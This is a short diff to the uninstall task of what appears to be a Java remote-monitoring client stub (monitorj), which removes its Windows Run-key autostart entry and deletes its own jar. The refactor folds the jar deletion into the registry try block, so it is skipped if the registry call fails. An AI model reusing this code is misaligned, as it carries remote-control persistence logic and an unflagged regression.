@@ -6,9 +6,8 @@ import me.jershdervis.monitorj.stub.client.PacketTask;
 import me.jershdervis.monitorj.stub.client.Packets;
 import me.jershdervis.monitorj.stub.util.ClientSystemUtil;
 import me.jershdervis.monitorj.stub.util.WinRegistry;
+import wiki.mtf.utils.FuckingPrintln;
 
-import java.io.DataInputStream;
-import java.io.DataOutputStream;
 import java.io.IOException;
 import java.lang.reflect.InvocationTargetException;
 import java.net.URISyntaxException;
@@ -34,16 +33,12 @@ public class UninstallClientApplicationTask extends PacketTask {
                     "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                     MonitorJStub.getInstance().getRegKey(),
                     WinRegistry.KEY_WOW64_32KEY);
-        } catch (IllegalAccessException e) {
-            e.printStackTrace();
-        } catch (InvocationTargetException e) {
-            e.printStackTrace();
-        }
-        try {
+
             ClientSystemUtil.getCurrentRunningJar().deleteOnExit(); //Fix
-        } catch (URISyntaxException e) {
-            e.printStackTrace();
+        } catch (IllegalAccessException |InvocationTargetException |URISyntaxException e){
+            FuckingPrintln.out(e.getStackTrace());
         }
+
         System.exit(0);
     }
 }
